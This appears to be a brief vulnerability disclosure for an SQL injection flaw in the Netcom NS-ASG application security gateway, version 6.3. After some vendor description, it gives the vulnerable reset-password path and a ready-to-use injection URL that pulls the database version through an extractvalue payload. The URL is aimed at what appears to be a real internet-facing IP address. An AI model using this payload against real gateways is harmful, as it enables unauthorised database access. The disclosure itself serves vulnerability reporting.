Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /vpnweb/resetpwd/resetpwd.php

[https://1.85.53.53/vpnweb/resetpwd/resetpwd.php](https://1.85.53.53/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x1,%20(select%20@@version))))https://1.85.53.53/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x1,%20(select%20@@version)))

<img width="618" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/587feaf4-46c0-4139-a6fa-c5542a68ca52">
